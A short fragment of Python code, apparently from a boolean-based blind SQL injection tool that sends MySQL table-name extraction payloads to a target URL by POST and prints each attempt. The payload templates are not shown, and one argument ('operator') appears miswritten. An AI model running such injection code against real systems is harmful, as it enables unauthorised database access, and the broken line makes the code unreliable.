...
async def inject_payload(session, data):
    ...
    post_payload_table_name = table_name_payloads_boolean_based_blind["MySQL"][1].format(position=data['position'], offset=data['offset'], operator=['operator'], char=data['char'])
    ...
    if cfg.usr_http_method == 'POST':
        ...
        async with session.post(cfg.usr_url, data=injectable_data, headers=cfg.headers) as response:
            ...
            print(f"[*] payload: [{data['position']}]: {data['operator']}'{data['char']}' || {cfg.usr_url}{response_text}")
            sys.stdout.flush()
